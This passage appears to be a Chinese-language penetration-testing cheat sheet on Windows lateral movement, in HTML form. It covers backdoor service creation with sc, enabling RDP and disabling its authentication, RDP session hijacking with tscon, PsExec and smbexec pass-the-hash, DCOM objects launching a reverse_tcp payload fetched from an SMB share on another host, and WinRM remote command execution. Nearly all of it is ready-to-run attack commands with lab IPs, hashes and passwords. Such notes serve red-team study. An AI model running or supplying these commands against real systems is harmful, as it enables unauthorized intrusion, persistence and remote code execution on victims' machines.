+<pre tabindex="0"><code>sc \\192.168.1.131 create Backdoor binpath= &#34;cmd.exe /k c:\users\public\reverse_tcp.exe&#34;
+##### binpath的等号后面需要有一个空格</code></pre><ul>
+<li>删除服务shell</li>
+</ul>
+<pre tabindex="0"><code>sc \\192.168.1.131 delete Backdoor</code></pre><h6 id="scshell" class="heading-element"><span>0.0.0.10.2  SCShell</span>
+  <a href="#scshell" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><h6 id="uac-remote-restrictions" class="heading-element"><span>0.0.0.10.3  UAC Remote Restrictions</span>
+  <a href="#uac-remote-restrictions" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><h5 id="远程桌面" class="heading-element"><span>0.0.0.11  远程桌面</span>
+  <a href="#%e8%bf%9c%e7%a8%8b%e6%a1%8c%e9%9d%a2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>查询注册表确定是否主机开启了远程桌面</p>
+<pre tabindex="0"><code>reg query &#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&#34; /v fDenyTSConnections 
+##### 若字段值为0，则表示已启动RDP；若为1，则表示禁用RDP</code></pre><p>开启远程桌面</p>
+<pre tabindex="0"><code>##### 开启远程桌面 
+reg add &#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&#34; /v fDenyTSConnections /t REG_DWORD /d 0 /f 
+##### 关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权） 
+reg add &#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34; /v UserAuthentication /t REG_DWORD /d 0  
+##### 设置防火墙策略放行3389端口 
+netsh advfirewall firewall add rule name=&#34;Remote Desktop&#34; protocol=TCP dir=in localport=3389 action=allow</code></pre><p>对于远程主机，可以通过WMI来开启远程桌面功能</p>
+<pre tabindex="0"><code>wmic /Node:192.168.1.131 /User:uf9n1x\Administrator /Password:123qwe@ RDTOGGLE WHRER ServerName=&#39;win2008&#39; call SetAllowTSConnections 1</code></pre><h6 id="rdp-hijack" class="heading-element"><span>0.0.0.11.1  RDP Hijack</span>
+  <a href="#rdp-hijack" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>可以通过SYSTEM权限劫持其他用户的RDP会话</p>
+<p>条件：</p>
+<ul>
+<li>SYSTEM</li>
+<li>可以执行tscon命令</li>
+</ul>
+<p>Windows系统下，<strong>tscon</strong>可被用来切换远程桌面的会话。正常情况下，切换会话时需要提供登录密码，但通过特殊的利用方法能够绕过验证，不输入密码实现未授权登录。</p>
+<p>可以通过<code>query user</code>来列出所有登录的用户列表，得到id</p>
+<p>在SYSTEM权限下，使用<code>tscon &lt;ID&gt;</code>来切换用户不需要验证密码。</p>
+<h6 id="sharp-rdp" class="heading-element"><span>0.0.0.11.2  sharp RDP</span>
+  <a href="#sharp-rdp" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p><a href="https://github.com/0xthirteen/SharpRDP"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/0xthirteen/SharpRDP</a></p>
+<p>sharp rdp可以通过远程桌面协议在远程主机上执行系统命令，且不需要GUI客户端。</p>
+<p>工具需要远程主机开启远程桌面功能，且防火墙放行3389端口</p>
+<h5 id="smb协议" class="heading-element"><span>0.0.0.12  SMB协议</span>
+  <a href="#smb%e5%8d%8f%e8%ae%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="psexec远程控制" class="heading-element"><span>0.0.0.12.1  PsExec远程控制</span>
+  <a href="#psexec%e8%bf%9c%e7%a8%8b%e6%8e%a7%e5%88%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>psExec是微软官方提供的一个Windows远程控制工具，可以根据凭据在远程系统上执行管理操作，并且可以获得与命令行几乎相同的实时交互性。该工具在MSF框架中也有集成。</p>
+<p>psexec 是 windows 下非常好的一款远程命令行工具。psexec的使用不需要对方主机开方3389端口，只需要对方开启admin$共享 (该共享默认开启)。但是，假如目标主机开启了防火墙，psexec也是不能使用的，会提示找不到网络路径。由于PsExec是Windows提供的工具，所以杀毒软件将其列在白名单中。</p>
+<p><strong>PsExec的基本原理</strong>：</p>
+<ul>
+<li>通过ipc$连接，释放二进制文件psexecsvc.exe到目标</li>
+<li>通过服务管理SCManager远程创建一个psexec服务，并启动服务</li>
+<li>客户端连接执行命令，服务端通过服务启动相应的程序执行命令并回显数据</li>
+<li>运行结束后删除服务</li>
+</ul>
+<p><strong>条件：</strong></p>
+<ul>
+<li>对方主机==开启了 admin$ 共享==，如果关闭了admin$共享，会提示：找不到网络名</li>
+<li>对方==未开启防火墙或放行445==端口</li>
+<li>如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。</li>
+<li>如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。连接普通域主机可以用普通域用户，连接域控只能用域管理员账户。</li>
+</ul>
+<p>用法：</p>
+<pre tabindex="0"><code>psexec.exe -accepteula \\192.168.1.131 -u Administrator -p 123qwe@ -s cmd.exe 
+##### -accepteula 禁止弹出许可证对话框 
+##### -s 以SYSTEM权限启动进程</code></pre><p>如果已经建立IPC连接，那么可以直接使用psexec连接远程主机</p>
+<pre tabindex="0"><code>psexec.exe -accepteula \\192.168.1.131 -s cmd.exe</code></pre><p>或者不提取shell，直接用目标系统的cmd.exe的/c选项在目标主机上执行命令，并得到回显（与前面的at命令相似）</p>
+<pre tabindex="0"><code>PsExec.exe \\192.168.1.131 &lt;Command&gt;
+PsExec.exe \\192.168.1.131 cmd.exe /c &#34;ipconfig&#34;
+PsExec.exe \\192.168.1.131 -u Administrator -p 123qwe@ cmd.exe /c &#34;ipconfig&#34;</code></pre><h6 id="smbexec" class="heading-element"><span>0.0.0.12.2  smbexec</span>
+  <a href="#smbexec" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p><strong>无需先 ipc 链接</strong>， 明文或 hash 传递（第三方库）</p>
+<pre tabindex="0"><code>smbexec uf9n1x/administrator:123qwe@@192.168.1.131
+smbexec ./administrator:123qwe@@192.168.1.131
+smbexec -hashes :$HASH$ ./admin@192.168.1.131
+smbbexec -hashes :$HASH$ domain/admin@192.168.1.131
+smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.1.131
+smbexec -hashes :ccef208c6485269c20db2cad21734fe7 uf9n1x/administrator@192.168.1.131</code></pre><h5 id="dcom" class="heading-element"><span>0.0.0.13  DCOM</span>
+  <a href="#dcom" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>COM（Component Object Model，组件对象模型）是微软的一套软件组成的二进制接口标准，使得跨编程语言的进程间通信、动态对象创建成为可能。COM指定了一个对象模型和编程要求，使COM对象能够与其他对象交互。这些对象可以在单个进程中，也可以在其它进程中，甚至可以在远程计算机中。在Windows中，每个COM对象都由唯一的128位的二进制标识符标识，即GUID。</p>
+<p>DCOM（Distracted Component Model，分布式组件对象模型）是基于COM的一系列概念和程序接口，支持不同机器上的组件间通信。利用DCOM，客户端程序对象可以请求来自网络中另一台计算机上的服务器程序对象。</p>
+<p>部分DCOM组件公开的接口中可能包含不安全的方法。执行以下命令，可以列出计算机上所有的DCOM程序组件</p>
+<pre tabindex="0"><code>Get-CimInstance Win32_DCOMApplication</code></pre><p>目前常利用的DCOM组件有：MMC20.Application、ShellWindows、Excel.Application、ShellBrowserWindow等。</p>
+<p>使用DCOM在远程主机上面执行命令，需要具有以下条件：</p>
+<ul>
+<li><strong>具有管理员权限的PowerShell</strong></li>
+<li><strong>可能需要关闭目标系统的防火墙。</strong></li>
+<li><strong>在远程主机上执行命令时，必须使用域管的administrator账户或者目标主机具有管理员权限的账户</strong></li>
+</ul>
+<h6 id="mmc20applicationhttpstttangcomarchive1890toc_mmc20application" class="heading-element"><span>0.0.0.13.1  <a href="https://tttang.com/archive/1890/#toc_mmc20application"target="_blank" rel="external nofollow noopener noreferrer">MMC20.Application</a></span>
+  <a href="#mmc20applicationhttpstttangcomarchive1890toc_mmc20application" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>MMC20.Application对象的Document.ActiveView下存在一个ExecuteShellCommand方法，可以用来启动子进程并运行执行的程序或系统命令。</p>
+<pre tabindex="0"><code>##### 通过progID与DCOM进行远程交互，并创建MMC20.Application对象的示例 
+$com =[activator]::CreateInstance([type]::GetTypeFromProgID(&#34;MMC20.Application&#34;,&#34;192.168.1.131&#34;)) 
+
+##### 调用ExecuteShellCommand方法启动进程，运行攻击载荷 $com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&#34;/c \\192.168.1.1\mysmb\reverse_tcp.exe&#34;, &#34;Minimized&#34;) 
+
+##### 合并一句话 [activator]::CreateInstance([type]::GetTypeFromProgID(&#34;MMC20.Application&#34;,&#34;192.168.1.131&#34;)).Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&#34;/c \\192.168.1.1\mysmb\reverse_tcp.exe&#34;, &#34;Minimized&#34;)</code></pre><h6 id="shellwindowshttpstttangcomarchive1890toc_shellwindows" class="heading-element"><span>0.0.0.13.2  <a href="https://tttang.com/archive/1890/#toc_shellwindows"target="_blank" rel="external nofollow noopener noreferrer">ShellWindows</a></span>
+  <a href="#shellwindowshttpstttangcomarchive1890toc_shellwindows" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>ShellWindows组件提供了Document.Application.ShellExecute方法，适用于Windows7及以上的系统。</p>
+<pre tabindex="0"><code>##### 通过PowerShell与DCOM进行远程交互，创建ShellWindows对象的实例: 
+$com=[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&#34;192.168.1 .131&#34;)) 
+
+##### 然后执行如下命令，我们就可以调用该对象的&#34;ShellExecute&#34;方法在远程主机上启动进程: $com.item().Document.Application.ShellExecute(&#34;cmd.exe&#34;,&#34;/c C:\shell.exe&#34;,&#34;c:\windows\system32&#34;,$null,0) 
+
+##### 完整的命令: 
+[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&#34;192.168.1.131&#34;)).item().Document.Application.ShellExecute(&#34;cmd.exe&#34;,&#34;/c C:\shell.exe&#34;,&#34;c:\windows\system32&#34;,$null,0)</code></pre><p>####### <a href="https://tttang.com/archive/1890/#toc_excelapplication"target="_blank" rel="external nofollow noopener noreferrer">Excel.Application</a></p>
+<pre tabindex="0"><code>##### 通过PowerShell与DCOM进行远程交互，创建Excel.Application对象的实例: 
+$com = [activator]::CreateInstance([type]::GetTypeFromprogID(&#34;Excel.Application&#34;,&#34;192.168.1.131&#34;)) 
+$com.DisplayAlerts = $false 
+
+##### 然后执行如下命令，我们就可以调用该对象的&#34;DDEInitiate&#34;方法在远程主机上启动进程: $com.DDEInitiate(&#34;cmd.exe&#34;,&#34;/c C:\shell.exe&#34;)</code></pre><p>####### <a href="https://tttang.com/archive/1890/#toc_shellbrowserwindow"target="_blank" rel="external nofollow noopener noreferrer">ShellBrowserWindow</a></p>
+<p>使用条件：适用于<strong>Windows 10和Windows Server 2012 R2</strong>等版本的系统。</p>
+<pre tabindex="0"><code>##### 通过PowerShell与DCOM进行远程交互，创建Excel.Application对象的实例: 
+$com = [activator]::CreateInstance([type]::GetTypeFromCLSID(&#34;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#34;,&#34;192.168.1.131&#34;)) 
+
+##### 然后执行如下命令，我们就可以调用该对象的&#34;shellExecute&#34;方法在远程主机上启动进程: $com.Document.Application.shellExecute(&#34;C:\shell.exe&#34;) 
+
+##### 完整的命令: 
+[activator]::CreateInstance([type]::GetTypeFromCLSID(&#34;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#34;,&#34;192.168.1.131&#34;)).Document.Application.shellExecute(&#34;C:\shell.exe&#34;)</code></pre><p>####### <a href="https://tttang.com/archive/1890/#toc_impacketdcomexecpy"target="_blank" rel="external nofollow noopener noreferrer">Impacket里的dcomexec.py脚本</a></p>
+<p>Impacket 里面提供的 dcomexec.py 脚本可以提供一个类似于 wmiexec.py 脚本的半交互式shell，但使用的是DCOM，目前支持MMC20.Application，ShellWindows和ShellBrowserWindow对象。</p>
+<p>命令格式如下：</p>
+<pre tabindex="0"><code>./dcomexec.py domain/username:password@ip 
+./dcomexec.py domain/username:password@ip &lt;command&gt;</code></pre><h5 id="winrm" class="heading-element"><span>0.0.0.14  WinRM</span>
+  <a href="#winrm" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>WinRM是通过执行WS-Management协议（用于远程软件和硬件管理的Web服务协议）来实现远程管理的，允许处于一个共同网络内的Windows计算机彼此之间互相访问和交换信息，对应的端口是5985。在一台计算机启用WinRM服务后，防火墙会自动放行其相关通信端口，在另一台计算机便能通过WinRM对其进行远程管理了。</p>
+<p><strong>只有在Windows Server 2008以上版本的服务器中，WinRm服务才会自动启动。</strong></p>
+<p>在利用WinRM进行横向移动时，需要拥有远程主机的管理员凭据信息。</p>
+<h6 id="通过winrm执行远程命令" class="heading-element"><span>0.0.0.14.1  通过WinRM执行远程命令</span>
+  <a href="#%e9%80%9a%e8%bf%87winrm%e6%89%a7%e8%a1%8c%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>Windows远程管理提供了两个工具：
+① Winrs，允许远程执行命令的命令行工具，利用了WS-Manage协议
+② Winrm（Winrm.cmd)，内置系统管理命令行工具，允许管理员配置本机的WinRM服务。</p>
+<p>在默认情况下，无法通过WinRM连接到目标系统。可能出现错误：Winrs error：WinRM客户端无法处理该请求。可以将默认身份验证与IP地址结合使用：
+① 传输为HTTPS或目标位于TrustedHosts列表中，并且提供显式凭据
+② 使用Winrm.cmd配置TrustedHosts。</p>
+<p>执行以下命令，将目标地址添加到TrustedHosts中：</p>
+<pre tabindex="0"><code>winrm set winrm/config/client @{TrustedHosts=&#34;192.168.1.1&#34;} 
+
+set-Item WSMan:localhost\client\trustedhosts -value *    
+##### 通过powershell，信任所有主机</code></pre><h6 id="winrs" class="heading-element"><span>0.0.0.14.2  Winrs</span>
+  <a href="#winrs" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>winrs是Windows上远程管理提供的客户端程序，允许通过提供的用户凭据，在运行WinRM的服务器上执行命令。要求通信双方都安装了WinRM服务。</p>
+<pre tabindex="0"><code>##### 执行系统命令 
+winrs -r:http://192.168.1.131:5985 -u:Administrator -p:123qwe@ &#34;whoami&#34; 
+##### 获取远程交互式命令行 
+winrs -r:http://192.168.1.131:5985 -u:Administrator -p:123qwe@ &#34;cmd&#34;</code></pre><h6 id="winrmcmd" class="heading-element"><span>0.0.0.14.3  Winrm.cmd</span>
+  <a href="#winrmcmd" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>winrm.cmd允许WMI对象通过WinRm传输进行远程交互，在本地或远程计算机上枚举WMI对象实例或调用WMI类方法。比如可以通过调用Win32_Process类的Create方法来创建远程实例。</p>
+<pre tabindex="0"><code>winrm invoke create wmicimv2/win32_process -SkipCAcheck -skipCNcheck @{commandline=&#34;notepad.exe&#34;} -r:http://192.168.1.131:5985 -u:Administrator -p:123qwe@</code></pre><h6 id="evil-winrm" class="heading-element"><span>0.0.0.14.4  Evil-Winrm</span>
+  <a href="#evil-winrm" class="heading-mark">
